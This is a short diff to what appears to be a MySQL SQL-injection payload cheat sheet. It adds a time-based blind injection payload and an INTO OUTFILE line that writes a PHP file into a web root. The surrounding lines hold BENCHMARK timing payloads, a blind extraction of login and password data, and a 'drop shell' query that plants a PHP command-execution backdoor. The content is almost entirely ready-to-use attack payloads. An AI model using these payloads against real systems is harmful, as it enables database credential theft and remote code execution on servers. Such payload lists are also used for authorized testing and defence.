@@ -54,6 +54,7 @@ AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ```
 +BENCHMARK(40000000,SHA1(1337))+
 '%2Bbenchmark(3200,SHA1(1))%2B'
+' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
 ```
 
 
@@ -71,4 +72,5 @@ AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ##MYSQL DROP SHELL
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
 ```
